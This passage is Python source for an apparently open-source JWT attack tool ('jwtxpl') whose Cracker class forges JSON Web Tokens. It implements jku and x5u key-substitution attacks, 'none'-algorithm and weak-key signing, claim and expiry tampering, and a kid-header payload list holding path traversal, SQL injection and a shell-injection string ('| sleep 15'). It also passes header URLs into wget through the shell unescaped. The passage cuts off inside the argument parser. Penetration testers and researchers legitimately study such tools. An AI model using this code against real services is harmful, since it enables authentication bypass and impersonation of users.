            file.write(json.dumps(jwks_dict, indent=4))
        os.remove(filename)

    def jku_via_header_injection(self, header):
        """
        :param header: The header dictonary -> dict.
        Same as self.jku_basic_attack, but instead of write a jwks file, returns the content in an HTTP response body
        format.

        :return: The crafted jwks string in an HTTP response body format.
        """
        filename = "jwtxpl_jwks.json"
        command = f"wget -O {filename} " + header['jku']
        try:
            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
        except subprocess.CalledProcessError:
            print(f"{Bcolors.FAIL}jwtxpl: err: Can't download jwks file from url specified in jku header{Bcolors.ENDC}")
            sys.exit(1)
        with open(filename) as jwks_orig_file:
            jwks_dict = json.load(jwks_orig_file)
        if len(jwks_dict['keys']) == 1:
            index = 0
        else:
            sign_hash = Cracker.get_sign_hash(self.alg)
            index = Cracker.find_verifier_key_from_jwks(self.token, jwks_dict, sign_hash, jwa=self.alg)
        try:
            if self.alg[:2] in ["RS", "PS"]:
                jwks_dict['keys'][index]['e'] = base64.urlsafe_b64encode(
                    self.key.pub.e.to_bytes(self.key.pub.e.bit_length() // 8 + 1, byteorder='big')
                ).decode('utf-8').rstrip("=")
                jwks_dict['keys'][index]['n'] = base64.urlsafe_b64encode(
                    self.key.pub.n.to_bytes(self.key.pub.n.bit_length() // 8 + 1, byteorder='big')
                ).decode('utf-8').rstrip("=")
            elif self.alg[:2] == "ES":
                jwks_dict['keys'][index]['x'] = base64.urlsafe_b64encode(
                    self.key.pub.x.to_bytes(self.key.pub.x.bit_length() // 8 + 1, byteorder='big')
                ).decode('utf-8').rstrip("=")
                jwks_dict['keys'][index]['y'] = base64.urlsafe_b64encode(
                    self.key.pub.y.to_bytes(self.key.pub.y.bit_length() // 8 + 1, byteorder='big')
                ).decode('utf-8').rstrip("=")
        except (TypeError, IndexError):
            print(f"{Bcolors.FAIL}jwtxpl: err: Non standard JWKS file{Bcolors.ENDC}")
            sys.exit(1)
        body = json.dumps(jwks_dict)
        os.remove(filename)
        return body

    def x5u_basic_attack(self, header):
        """
        :param header: The header dictonary -> dict

        Gets the jwks.json file from the url specified in the x5u header. Then loads the file as json in order to
        access it and changes the x5c (the X509 cert) with our generated one. Then creates a file named jwks.json
        under the crafted/ directory and write the dump of the jwks dict into it.
        """
        filename = "jwtxpl_jwks.json"
        command = f"wget -O {filename} " + header['x5u']
        try:
            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
        except subprocess.CalledProcessError:
            print(f"{Bcolors.FAIL}jwtxpl: err: Can't download jwks file from url specified in x5u header{Bcolors.ENDC}")
            sys.exit(1)
        with open("testing.crt", 'r') as cert_file:
            x5c_ = "".join([line.strip() for line in cert_file if not line.startswith('---')])
        with open(filename) as jwks_orig_file:
            jwks_dict = json.load(jwks_orig_file)
        if len(jwks_dict['keys']) == 1:
            index = 0
        else:
            sign_hash = Cracker.get_sign_hash(self.alg)
            index = Cracker.find_verifier_key_from_jwks(self.token, jwks_dict, sign_hash, jwa=self.alg)
        try:
            if isinstance(jwks_dict['keys'][index]['x5c'], list):
                jwks_dict['keys'][index]['x5c'].insert(0, x5c_)
            else:
                jwks_dict['keys'][index]['x5c'] = x5c_
            if self.alg[:2] in ["RS", "PS"]:
                jwks_dict['keys'][index]['n'] = self.key.pub.n
                jwks_dict['keys'][index]['e'] = self.key.pub.e
            elif self.alg[:2] == "ES":
                jwks_dict['keys'][index]['x'] = self.key.pub.x
                jwks_dict['keys'][index]['y'] = self.key.pub.y
            # Need an else? Even if alg has already been validated???
        except (TypeError, IndexError):
            print(f"{Bcolors.FAIL}jwtxpl: err: Non standard JWKS file{Bcolors.ENDC}")
            sys.exit(1)
        with open("{CWD}crafted/jwks.json", 'w'):
            file.write(json.dumps(jwks_dict, indent=4))
        os.remove(filename)

    def x5u_via_header_injection(self, header):
        """
        :param header: The header dictonary -> dict

        Same as self.x5u_basic attack, but instead of write the jwks file, returns its content in an HTTP response
        body format.

        :return: The crafted jwks string in an HTTP response body format.
        """
        filename = "jwtxpl_jwks.json"
        command = f"wget -O {filename} " + header['x5u']
        try:
            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
        except subprocess.CalledProcessError:
            print(f"{Bcolors.FAIL}Can't download the jwks file from the url specified in x5u header{Bcolors.ENDC}")
            sys.exit(1)
        with open("testing.crt", 'r') as cert_file:
            x5c_ = "".join([line.strip() for line in cert_file if not line.startswith('---')])
        with open(filename) as jwks_orig_file:
            jwks_dict = json.load(jwks_orig_file)
        if len(jwks_dict['keys']) == 1:
            index = 0
        else:
            sign_hash = Cracker.get_sign_hash(self.alg)
            index = Cracker.find_verifier_key_from_jwks(self.token, jwks_dict, sign_hash, jwa=self.alg)
        try:
            if isinstance(jwks_dict['keys'][index]['x5c'], list):
                jwks_dict['keys'][index]['x5c'].insert(0, x5c_)
            else:
                jwks_dict['keys'][index]['x5c'] = x5c_
            if self.alg[:2] in ["RS", "PS"]:
                jwks_dict['keys'][index]['n'] = self.pub.n
                jwks_dict['keys'][index]['e'] = self.pub.e
            elif self.alg[:2] == "ES":
                jwks_dict['keys'][index]['x'] = self.pub.x
                jwks_dict['keys'][index]['y'] = self.pub.y
        except (TypeError, IndexError):
            print(f"{Bcolors.FAIL}jwtxpl: err: Non standard JWKS file{Bcolors.ENDC}")
            sys.exit(1)
        body = json.dumps(jwks_dict)
        os.remove(filename)
        return body

    def select_signature(self, partial_token):
        """
        Creates a signature for the new token.

        :param partial_token: The first two part of the crafted jwt -> str.

        If self.unverified is present its define the signature as the one of the original token.
        Else, it checks which algorithm has been chosen by the user; with 'None' algorithm it stores an empty string
        as signature, while with HS256 it encrypts the partial_token with the key (self.keys) and, of course, using
        sha256. It encodes it in base64, and strips all trailing '='. With RSA it use self.key.priv to sign the token,
        using sha256 as algorithm and PKCS1v15 as padding. It encodes it in base64 and strips all trailing '='.

        :return: The generated signature.
        """
        if self.unverified:
            signature = self.token_dict['signature']
        else:
            sign_hash = Cracker.get_sign_hash(self.alg)
            try:
                if self.alg == "None" or self.alg == "none":
                    signature = ""
                elif self.alg[:2] == "HS":
                    if self.key is None:
                        print(f"{Bcolors.FAIL}jwtxpl: err: Key is needed with HS*{Bcolors.ENDC}")
                        sys.exit(4)
                    signature = Cracker.sign_token_with_hmac(self.key, partial_token, sign_hash)
                elif self.alg[:2] == "RS":
                    if self.key is None:
                        print(f"{Bcolors.FAIL}jwtxpl: err: Key is needed with RS*{Bcolors.ENDC}")
                        sys.exit(4)
                    signature = Cracker.sign_token_with_rsa_pkcs1(self.key, partial_token, sign_hash)
                elif self.alg[:2] == "PS":
                    if self.key is None:
                        print(f"{Bcolors.FAIL}jwtxpl: err: Key is needed with PS*{Bcolors.ENDC}")
                        sys.exit(4)
                    signature = Cracker.sign_token_with_rsa_pss(self.key, partial_token, sign_hash)
                elif self.alg[:2] == "ES":
                    if self.key is None:
                        print(f"{Bcolors.FAIL}jwtxpl: err: Key is needed with ES*{Bcolors.ENDC}")
                        sys.exit(4)
                    signature = Cracker.sign_token_with_ec(self.key, partial_token, sign_hash)
            except (TypeError, AttributeError):
                print(f"{Bcolors.FAIL}jwtxpl: err: Key mismatch: The key you passed is not compatible with {self.alg}{Bcolors.ENDC}")
                sys.exit(2)
        return signature

    @staticmethod
    def inject_kid(payload):
        """
        A function to test for injections in the kid header.

        :param payload: The payload to select -> str

        Defines a dictionary containing payloads to inject in the key header, and grabs the ones select by the user.
        This function is intended to be updated with new payloads.

        :return: The related payload string

        """
        kid_payloads = {
            "DirTrv": "../../../../../dev/null",
            "SQLi": "' union select 'zzz",
            "RCE": f"| sleep 15",
        }

        return kid_payloads[payload]

    @staticmethod
    def check_token(token):
        """
        A method for verify if a JWT have a valid pattern.

        :param token: A JWT -> str.

        Creates a regex pattern and looks if the token match it.

        :return: True, if the token match the pattern, False if not.
        """
        token_pattern = r"^eyJ.+\.eyJ.+\..*$"
        match = re.match(token_pattern, token)
        if match:
            return True
        else:
            return False

    @staticmethod
    def dictionarize_token(token):
        """
        A method that stores in a dict the three part ok a JWT.

        :param token: A JWT -> str.

        Splits the token in three part (header, payload, signature) and creates a dict with thees data.

        :return: The created dict object
        """
        token_list = token.split(".")
        if len(token_list) < 3:
            token_list.append("")
        token_dict = dict(header=token_list[0], payload=token_list[1], signature=token_list[2])
        return token_dict

    @staticmethod
    def append_equals_if_needed(string):
        """
        Corrects a string that is intended to be base64 decoded.

        :param string: A string, base64 encoded part of a JWT -> str.

         Since JWT are base64 encoded but the equals signs are stripped, this function appends them to the
         string given as input, only if necessary.

         If the string can't be decoded after the second equal sign has been appended, it returns an error.

        :return: A byte-string ready to be base64 decoded.
        """
        encoded = string.encode()
        final_text = b""
        i = 0
        while not final_text:
            try:
                decoded = base64.urlsafe_b64decode(encoded)
                final_text = encoded
                return final_text
            except binascii.Error:
                if i == 2:
                    print(f"{Bcolors.FAIL}jwtxpl: err: Error during token or jwks base64 decoding.{Bcolors.ENDC}")
                    sys.exit(1)
                encoded += b'='
                i += 1

    @staticmethod
    def url_escape(string, chars, spaces=True):
        """
        :param string: The string to url encode -> str
        :param chars: The only characters to encode in the string -> str
        :param spaces: If true automatically appends a space to the chars parameter -> Bool

        The function, given a string, replaces characters specified in the chars parameter with their url encoded one.
        By default, if the space character is not specified in the chars parameter, the function automatically appends it.

        :return: The original string with the specified characters url encoded
        """
        if " " not in chars and spaces:
            chars += " "
        encoded = [urllib.parse.quote(char).lower() for char in chars]
        for i in range(len(chars)):
            string = string.replace(chars[i], encoded[i])
        return string

    @staticmethod
    def decode_encoded_token(iterable):
        """
        :param iterable: A dict object populated with the three parts of a JWT -> dict.

        This function simply take the header and the payload from a dictionary created with dictionarize_token, passes
        them to append_equals_if_needed and decodes them.

        :return: The decoded header, and the decoded payload as strings.
        """
        if iterable['header'] is None or iterable['payload'] is None:
            print(f"{Bcolors.OKBLUE}Please pass the token dict as parameter{Bcolors.ENDC}")
        header_b64 = Cracker.append_equals_if_needed(iterable["header"])
        payload_b64 = Cracker.append_equals_if_needed(iterable["payload"])
        try:
            header_ = base64.urlsafe_b64decode(header_b64).decode('utf-8')
            payload_ = base64.urlsafe_b64decode(payload_b64).decode('utf-8')
        except UnicodeDecodeError:
            print(f"{Bcolors.FAIL}jwtxpl: err: Decoding Error. Please be sure to pass a valid jwt{Bcolors.ENDC}")
            sys.exit(3)
        return header_, payload_

    @staticmethod
    def change_payload(user_input, iterable):
        """
        :param user_input: A key:value string -> str.
        :param iterable: A dict object representing the original decoded payload of the JWT -> dict.

        Given a string with this 'name:value' format, splits it, look for a <name> key in the iterable and, if it's,
        change its value to <value>. If it doesn't find <name> in the iterable's keys, print an error and quits out.

        :return: The dictionary with the changes done.
        """
        try:
            new_payload = user_input.split(":")
            new_payload_key = new_payload[0]
            new_payload_value = Cracker.build_values(new_payload[1])
        except IndexError:
            print(f"{Bcolors.FAIL}jwtxpl: err: Payload must have this syntax: name:value. You have written '{user_input}'{Bcolors.ENDC}")
            sys.exit(5)
        if new_payload_key not in iterable.keys():
            print(f"{Bcolors.WARNING}jwtxpl: warn: can't find {new_payload_key} in the token payload. It will be added{Bcolors.ENDC}")
        iterable[new_payload_key] = new_payload_value
        return iterable

    @staticmethod
    def delete_key(iterable, key):
        """
        :param iterable: The header dictionary or the payload one -> dict
        :param key: The key to delete from the dictionary -> str

        The function first checks that the specified key exists in the dictionary, else returns an error and quits out.
        If the key exists, it delete the related item from the dictionary.

        :return: The modified dictionary
        """
        if key not in iterable.keys():
            print(f"{Bcolors.FAIL}The key {key} does not exists in the specified section{Bcolors.ENDC}")
            sys.exit(6)
        del iterable[key]
        return iterable

    @staticmethod
    def add_key(iterable, key):
        """
        :param iterable: The header dictionary or the payload one -> dict
        :param key: The key to insert into the dictionary -> str

        The function first check that the specified key does not already exists in the dictionary, else returns an error and
        quits out. If the key does not exists, it adds the new items with a default value.

        :return: The modified dictionary
        """
        if key in iterable.keys():
            print(f"{Bcolors.FAIL}jwtxpl: err: You are trying to add a key that already exists{Bcolors.ENDC}")
            sys.exit(6)
        iterable[key] = "default"
        return iterable

    @staticmethod
    def encode_token_segment(json_string):
        """
        :param json_string. A json string representing the header or the payload -> str.

        Pretty self explanatory...

        :return: The base64 encoded string, so one part of the final token.
        """
        encoded_new_segment_bytes = base64.urlsafe_b64encode(json_string.encode("utf-8"))
        encoded_new_segment_string = str(encoded_new_segment_bytes, 'utf-8').rstrip("=")
        return encoded_new_segment_string

    @staticmethod
    def craft_token(header_, payload_):
        """
        :param header_: The json string representing the header -> str
        :param payload_: The json string representing the payload -> str

        Calls encode_token_segment on header_ and payload_ and then sum them.

        :return: The encoded header + the encoded payload as string separated by a dot. The firsts two part of a JWT.
        """
        encoded_header = Cracker.encode_token_segment(header_)
        encoded_payload = Cracker.encode_token_segment(payload_)
        return encoded_header + "." + encoded_payload

    @staticmethod
    def modify_time_claims(qt, iterable, instruction="add"):
        """
        :param qt: The quantity of hours the del/add from time claims -> int
        :param iterable: The payload dict -> dict
        :param instruction: 'add' if time have to be added 'del' if deleted.

        Checks that iterable contain time claims and that qt has a valid value, then modify
        them
        :return: The modified iterable
        """
        time_claims = ['iat', 'exp', 'nbf']
        if not any(claim in iterable.keys() for claim in time_claims):
            print(f"{Bcolors.FAIL}jwtxpl: err: Token payload has no time claim{Bcolors.ENDC}")
            sys.exit(6)
        for claim in time_claims:
            if claim in iterable.keys() and isinstance(iterable[claim], int):
                if instruction == "add":
                    iterable[claim] += qt * 3600
                elif instruction == "del":
                    iterable[claim] -= qt * 3600
        return iterable

    @staticmethod
    def get_sign_hash(alg):
        """
        :param alg: The JWA -> str

        :return: The right hash method
        """
        if alg[:2] == "HS":
            if alg.endswith("256"):
                sign_hash = hashlib.sha256
            elif alg.endswith("384"):
                sign_hash = hashlib.sha384
            elif alg.endswith("512"):
                sign_hash = hashlib.sha512
        elif alg[:2] == "RS" or alg[:2] == "PS" or alg[:2] == "ES":
            if alg.endswith("256"):
                sign_hash = hashes.SHA256()
            elif alg.endswith("384"):
                sign_hash = hashes.SHA384()
            elif alg.endswith("512"):
                sign_hash = hashes.SHA512()
        else:
            return None
        return sign_hash

    @staticmethod
    def get_ec_curve(alg):
        """
        :param alg: The JWA -> str

        :return: The right curve method
        """
        if alg[:2] != "ES":
            return None
        if alg[-3:] == "256":
            curve = ec.SECP256R1()
        elif alg[-3:] == "384":
            curve = ec.SECP384R1()
        elif alg[-3:] == "521":
            curve = ec.SECP521R1()
        else:
            return None
        return curve

    @staticmethod
    def sign_token_with_hmac(key, partial_token, sign_hash):
        """
        :param key: The key used to sign the token -> str
        :param partial_token: A JWT without the signature -> str
        :param sign_hash: The hash method to use -> hashlib method

        :return: The generated signature
        """
        signature = base64.urlsafe_b64encode(hmac.new(key.encode(), partial_token.encode(), sign_hash).digest()).decode().rstrip("=")
        return signature

    @staticmethod
    def sign_token_with_rsa_pkcs1(key, partial_token, sign_hash):
        """
        :param key: The private key -> cryptography.hazmat.backends.openssl.rsa._RSAPrivateKey object
        :param partial_token: A JWT without the signature -> str
        :param sign_hash: The hash method to use -> cryptography.hazmat.primitives.hashes method

        :return: The generated signature
        """
        signature = base64.urlsafe_b64encode(
            key.sign(partial_token.encode(), algorithm=sign_hash, padding=padding.PKCS1v15())
        ).decode().rstrip("=")
        return signature

    @staticmethod
    def sign_token_with_rsa_pss(key, partial_token, sign_hash):
        """
        :param key: The private key -> cryptography.hazmat.backends.openssl.rsa._RSAPrivateKey object
        :param partial_token: A JWT without the signature -> str
        :param sign_hash: The hash method to use -> cryptography.hazmat.primitives.hashes method

        :return: The generated signature
        """
        signature = base64.urlsafe_b64encode(
            key.sign(partial_token.encode(), algorithm=sign_hash, padding=padding.PSS(
                mgf=padding.MGF1(sign_hash), salt_length=padding.PSS.MAX_LENGTH))
        ).decode().rstrip("=")
        return signature

    @staticmethod
    def sign_token_with_ec(key, partial_token, sign_hash):
        """
        :param key: The private key -> cryptography.hazmat.backends.openssl.rsa._EllipticCurvePrivateKey object
        :param partial_token: A JWT without the signature -> str
        :param sign_hash: The hash method to use -> cryptography.hazmat.primitives.hashes method

        :return: The generated signature
        """
        signature = base64.urlsafe_b64encode(key.sign(partial_token.encode(), ec.ECDSA(sign_hash))).decode().rstrip("=")
        return signature

    @staticmethod
    def verify_token_with_hmac(key, token, sign_hash):
        """
        :param key: The key to use for signature generation -> str
        :param token: A complete JWT -> str
        :param sign_hash The hash method to use -> hashlib method

        Generates a signature using key and checks if it differs from the JWT one
        :return: True, if signatures do not differ, else False. None if token_alg is not valid
        """
        untrusted_signature = token.split(".")[2]
        partial_token = ".".join(token.split(".")[:2])
        our_signature = Cracker.sign_token_with_hmac(key, partial_token, sign_hash)
        if our_signature == untrusted_signature:
            return True
        else:
            return False

    @staticmethod
    def verify_token_with_rsa_pkcs1(key, token, sign_hash):
        """
        :param key: The key to use for signature verification -> cryptography.hazmat.backends.openssl.rsa._RSAPublicKey object
        :param token: A complete JWT -> str
        :param sign_hash: The hash method to use -> cryptography.hazmat.primitives.hashes method

        :return: False if signature is invalid, True else.
        """
        partial_token = ".".join(token.split(".")[:2])
        untrusted_signature_to_decode = Cracker.append_equals_if_needed(token.split(".")[2])
        untrusted_signature = base64.urlsafe_b64decode(untrusted_signature_to_decode)
        try:
            is_valid_if_none = key.verify(untrusted_signature, partial_token.encode(), algorithm=sign_hash, padding=padding.PKCS1v15())
        except InvalidSignature:
            return False
        if is_valid_if_none is None:
            return True

    @staticmethod
    def verify_token_with_rsa_pss(key, token, sign_hash):
        """
        :param key: The key to use for signature verification -> cryptography.hazmat.backends.openssl.rsa._RSAPublicKey object
        :param token: A complete JWT -> str
        :param sign_hash: The hash method to use -> cryptography.hazmat.primitives.hashes method

        :return: False if signature is invalid, True else.
        """
        partial_token = ".".join(token.split(".")[:2])
        untrusted_signature_to_decode = Cracker.append_equals_if_needed(token.split(".")[2])
        untrusted_signature = base64.urlsafe_b64decode(untrusted_signature_to_decode)
        try:
            is_valid_if_none = key.verify(
                untrusted_signature, partial_token.encode(), algorithm=sign_hash,
                padding=padding.PSS(mgf=padding.MGF1(sign_hash), salt_length=padding.PSS.MAX_LENGTH)
            )
        except InvalidSignature:
            return False
        if is_valid_if_none is None:
            return True

    @staticmethod
    def verify_token_with_ec(key, token, sign_hash):
        """
        :param key: The key to use for signature verification -> cryptography.hazmat.backends.openssl.rsa._RSAPublicKey object
        :param token: A complete JWT -> str
        :param sign_hash: The hash method to use -> cryptography.hazmat.primitives.hashes method

        :return: False if signature is invalid, True else.
        """
        partial_token = ".".join(token.split(".")[:2])
        untrusted_signature_to_decode = Cracker.append_equals_if_needed(token.split(".")[2])
        untrusted_signature = base64.urlsafe_b64decode(untrusted_signature_to_decode)
        try:
            is_valid_if_none = key.verify(untrusted_signature, partial_token.encode(), ec.ECDSA(sign_hash))
        except InvalidSignature:
            return False
        if is_valid_if_none is None:
            return True

    @staticmethod
    def read_pem_public_key(path):
        """
        :param path: The path to the pem public key -> str

        Read the key file and generates a cryptography public key from it
        :return: The public key object
        """
        with open(path, 'rb') as keyfile:
            try:
                public_key = load_pem_public_key(keyfile.read())
            except ValueError:
                return None
        return public_key

    @staticmethod
    def read_pem_certificate(path):
        """
        :param path: The path to the pem certificate -> str

        Read the cert file and generates a cryptography x509 object
        :return: The certificate object
        """
        with open(path, 'rb') as crtfile:
            try:
                certificate = load_pem_x509_certificate(crtfile.read())
            except ValueError:
                return None
        return certificate

    @staticmethod
    def read_pem_private_key(path, password=None):
        """
        :param path: The path to the pem private key -> str

        Read the key file and generates a cryptography private key from it
        :return: The private key object
        """
        with open(path, 'rb') as keyfile:
            try:
                private_key = load_pem_private_key(keyfile.read(), password)
            except ValueError:
                return None
        return private_key

    @staticmethod
    def gen_rsa_public_key_from_jwk(jwk):
        """
        :param jwk: A jwk claim -> dict

        Extrac n and e from the jwk and craft the relative public key
        :return: The public key.
        """
        try:
            n_64 = jwk['n']
            e_64 = jwk['e']
        except KeyError:
            return None
        n_bytes = base64.urlsafe_b64decode(Cracker.append_equals_if_needed(n_64))
        e_bytes = base64.urlsafe_b64decode(Cracker.append_equals_if_needed(e_64))
        n = int.from_bytes(n_bytes, byteorder="big")
        e = int.from_bytes(e_bytes, byteorder="big")
        public_numbers = RSAPublicNumbers(e, n)
        public_key = public_numbers.public_key(backend)
        return public_key

    @staticmethod
    def gen_ec_public_key_from_jwk(jwk, alg):
        """
        :param jwk: A JWK claim -> dict
        :param alg: The JWA -> str

        Extrac x and y from the jwk and craft the relative public key
        :return: The public key
        """
        try:
            x_64 = jwk['x']
            y_64 = jwk['y']
        except KeyError:
            return None
        ec_curve = Cracker.get_ec_curve(alg)
        x_bytes = base64.urlsafe_b64decode(Cracker.append_equals_if_needed(x_64))
        y_bytes = base64.urlsafe_b64decode(Cracker.append_equals_if_needed(y_64))
        x = int.from_bytes(x_bytes, byteorder="big")
        y = int.from_bytes(y_bytes, byteorder="big")
        public_numbers = EllipticCurvePublicNumbers(x, y, ec_curve)
        public_key = public_numbers.public_key(backend)
        return public_key

    @staticmethod
    def gen_public_key_from_x5c(jwk):
        """
        :param jwk: A JWK claim -> dict

        First checks if the x5c claim is an array or a string (usually is array), and stores the
        value in the x5c variable. Then decodes the x5c and uses the obtained bytes to generate
        the cert. Finally extracts the public key from the certificate.
        :return: The public key
        """
        try:
            if isinstance(jwk['x5c'], list):
                x5c = jwk['x5c'][0]
            elif isinstance(jwk['x5c'], str):
                x5c = jwk['x5c']
        except KeyError:
            return None
        x5c_bytes = base64.b64decode(x5c.encode())
        cert = load_der_x509_certificate(x5c_bytes)
        public_key = cert.public_key()
        return public_key

    @staticmethod
    def find_verifier_key_from_jwks(token, jwks_dict, sign_hash, jwa="RS256"):
        """
        :param token: A complete JWT -> str
        :param jwks_dict: The content of a jwks file loaded with json -> dict
        :param sign_hash: The hash for verification -> cryptography.hazmat.primitives.hashes method
        :param jwa: The token algorithm -> str

        Given a jwks object, for all jwk it contains, generate the public key and try to verify the token
        with it. If the verification is successful, it breaks the loop.
        :return: The jwk object index or None if no keys can verify the token
        """
        i = 0
        for jwk in jwks_dict['keys']:
            if 'x5c' in jwk.keys():
                public_key = Cracker.gen_public_key_from_x5c(jwk)
            else:
                if jwa[:2] == "ES":
                    public_key = Cracker.gen_ec_public_key_from_jwk(jwk, jwa)
                elif jwa[:2] in ["RS", "PS"]:
                    public_key = Cracker.gen_rsa_public_key_from_jwk(jwk)
            if public_key is None:
                return None
            if jwa[:2] == "RS":
                is_this_key = Cracker.verify_token_with_rsa_pkcs1(public_key, token, sign_hash)
            elif jwa[:2] == "PS":
                is_this_key = Cracker.verify_token_with_rsa_pss(public_key, token, sign_hash)
            elif jwa[:2] == "ES":
                is_this_key = Cracker.verify_token_with_ec(public_key, token, sign_hash)
            else:
                return None
            if is_this_key:
                return i
            i += 1
        return None

    @staticmethod
    def build_keys(string):
        """
        Build a list of keys
        :param string: A string containing the keys, separated by ',' -> str

        The function first check for the separator, and quits out if is not present. Then split the string and check for
        integers ones.

        :return: The list of keys, or None if separator is not present in string
        """
        if "," not in string:
            return string
        keys = string.split(",")
        for i in range(len(keys)):
            if keys[i] == "":
                keys.remove(keys[i])
                continue
            try:
                keys[i] = int(keys[i])
            except ValueError:
                continue
        return keys

    @staticmethod
    def build_values(string):
        """
        Build a list of values
        :param string: A string containing one value, or a list of them separated by commas -> str

        If at least one comma is present in the string, the function splits it by commas. Then it checks in the returned
        list, if any empty string exists and, case it is, deletes them. If any value is "null" it convert it in None.

        :return: The values list, if string contained values comma separated, else the string itself or None if the string
        was "null".
        """
        if "," in string:
            values = string.split(",")
            for i in range(len(values)):
                if values[i] == "":
                    values.remove(values[i])
                if values[i] == "null":
                    values[i] = None
            return values
        if string == "null":
            return None
        return string

    @staticmethod
    def change_payload_complex(string, iterable):
        """
        :param string: A key:value pair where key is a set of keys and value a set of values or a single one -> str
        :param iterable: The payload dictionary -> dict

        The function calls build_keys and build_values, passing them the rith part of the string (splitted by ':').
        Then it iterates trough the keys list building the path to iterable item to be changed. When the item
        has been accessed (the last iteration in the keys list), it assign it the value generated by build_vals

        :return: The modified payload dictionary
        """
        keys = Cracker.build_keys(string.split(":")[0].strip(","))
        vals = Cracker.build_values(string.split(":")[1].lstrip(","))
        if not isinstance(keys, list) and not len(keys) > 1:
            print(f"{Bcolors.FAIL}jwt: err: Can't split keys basing on ','. If you can access the claim using a single key, pleas use --payload{Bcolors.ENDC}")
            sys.exit(5)
        i = 0
        for key in keys:
            try:
                if i == 0:
                    keys_path = iterable[key]
                else:
                    if i == len(keys) -1:
                        keys_path[key] = vals
                        break
                    keys_path = keys_path[key]
                i += 1
            except (KeyError, TypeError):
                print(f"{Bcolors.FAIL}jwtxpl: err: Key '{key}' is not present in payload{Bcolors.ENDC}")
                sys.exit(6)
        return iterable

    @staticmethod
    def get_key_from_ssl_cert(domain):
        """
        :param domain: The domain name of which you want to retrieve the cert -> str

        First open devnull to redirect stdin, stdout or stderr if necessary, and defines a regex pattern to match the output of
        our first command. Then defines the command that we need to retrieve an ssl cert, launches it with subprocess and handle
        enventual errors. At this points, the function uses regex to grab the content that wee need, and writes that content in a
        file (cert.pem). Then defines the second command, and launches it. Since this command should have no output, if we have,
        breaks out and returns an error. Else stores the path for the generated key, and closes devnull.

        :retrun the path to the generated key.
        """
        devnull_ = open(os.devnull, 'wb')
        pattern = r'(?:Server\scertificate\s)((.|\n)*?)subject='
        """Get cert.pem"""
        first_command = f"openssl s_client -connect {domain}:443"
        try:
            first_command_output = subprocess.check_output(
                first_command, shell=True, stdin=devnull_, stderr=devnull_
            ).decode('utf-8')
        except subprocess.CalledProcessError:
            print(
                f"{Bcolors.FAIL}jwtxpl: err: Can't openssl s_client can't connect with {domain}. Please make sure to type correctly{Bcolors.ENDC}"
            )
            sys.exit(21)
        cert = re.findall(pattern, first_command_output)[0][0].rstrip("\n")
        """Write cert.pem"""
        with open("cert.pem", 'w') as file:
            file.write(cert)
        """Extract key.pem"""
        second_command = "openssl x509 -in cert.pem -pubkey -noout > key.pem"
        second_command_output = subprocess.check_output(
            second_command, shell=True, stdin=devnull_, stderr=subprocess.STDOUT
        )
        if second_command_output:
            print(f"{Bcolors.FAIL}jwtxpl: err: Maybe the cert is not valid{Bcolors.ENDC}")
            sys.exit(21)
        key = f"{os.getcwd()}/key.pem"
        devnull_.close()
        return key

    @staticmethod
    def generate_jwk(kid, public_numbers, jwa="RS256"):
        """
        Generation of a jwk claim
        :param kid: The key identifier -> str
        :param public_numbers: The public key public numbers -> list
        :param jwa: The json web algorithm -> str

        :return: The generated jwk
        """
        jwk = dict()
        if jwa[:2] in ["RS", "PS"]:
            jwk['kty'] = "RSA"
            jwk['n'] = public_numbers[0]
            jwk['e'] = public_numbers[1]
        elif jwa[:2] == "ES":
            jwk['kty'] = "EC"
            jwk['x'] = public_numbers[0]
            jwk['y'] = public_numbers[1]
        jwk['kid'] = kid
        jwk['use'] = "sig"
        jwk['alg'] = jwa
        return jwk

    @staticmethod
    def embed_jwk_in_jwt_header(iterable, jwk):
        """
        :param iterable: The header dictionary -> dict
        :param jwk: The jwk to insert into iterable -> dict

        :return: The modified header dictionary
        """
        if 'keys' not in iterable.keys():
            iterable['keys'] = list()
        iterable['keys'].insert(0, jwk)
        return iterable

    def run(self):
        """
        The function to run the attack.

        This function will run after main conflicts has already been solved, and call methods that already know which attack to run.
        First, if self.decode is True, run self.decode_and_quit, so the script will quits here. If we goes on, we know that self.alg
        must not be None, if it's quits out.
        Else crafts the token header and payload, signs them and generates the final token. Than prints the final token to stdout and
        checks for open files to close.
        """
        if self.decode:
            self.decode_and_quit()
        if self.alg is None:
            print(f"{Bcolors.FAIL}jwtxpl: err: Missing --alg. Alg is required if you are not decoding(2){Bcolors.ENDC}")
            sys.exit(4)
        if self.verify_token_with is not None:
            self.verify_and_quit()
        header, payload = self.modify_header_and_payload()
        new_partial_token = Cracker.craft_token(header, payload)
        signature = self.select_signature(new_partial_token)
        final_token = new_partial_token + "." + signature
        print(f"{Bcolors.HEADER}Crafted header ={Bcolors.ENDC} {Bcolors.OKCYAN}{header}{Bcolors.ENDC}, {Bcolors.HEADER}Crafted payload ={Bcolors.ENDC} {Bcolors.OKCYAN}{payload}{Bcolors.ENDC}")
        print(f"{Bcolors.BOLD}{Bcolors.HEADER}Final Token:{Bcolors.ENDC} {Bcolors.BOLD}{Bcolors.OKBLUE}{final_token}{Bcolors.ENDC}")
        if self.file is not None:
            self.file.close()
        if os.path.exists("key.pem"):
            os.remove("key.pem")
        if os.path.exists("cert.pem"):
            os.remove("cert.pem")
        if os.path.exists("testing.crt"):
            os.remove("testing.crt")
        self.devnull.close()
        sys.exit(0)


if __name__ == '__main__':

    # Initialize the parser
    parser = argparse.ArgumentParser(
        usage=Cracker.usage,
        description=Cracker.description,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    # Add the arguments
    parser.add_argument(
                        "token",
                        help="Your JWT"
                        )
    parser.add_argument("-a", "--alg",
                        help="The algorithm for the attack (None, none, HS256, RS256)",
                        metavar="<algorithm>", required=False
                        )
    parser.add_argument("-k", "--key",
                        help="The path to the key file",
                        metavar="<keyfile>", required=False
                        )
    parser.add_argument("-p", "--payload",
                        action="append", nargs="+",
                        help="A claim you want to change in the payload and the value to issue, as key:value pairs. If value have to be a list, pass list items as comma separated values.",
                        metavar="<key>:<value>", required=False
                        )
    parser.add_argument("-d", "--decode", action="store_true",
                        help="Just decode the token and quit",
                        required=False
                        )
    parser.add_argument("-b", "--blank", action="store_true",
                        help="Set key as a blank string. Only with HS256",
                        required=False
                        )
    parser.add_argument("-t", "--subtract-time",
                        help="Hours to delete from time claims if any ('iat', 'exp', 'nbf'). From 1 to 24",
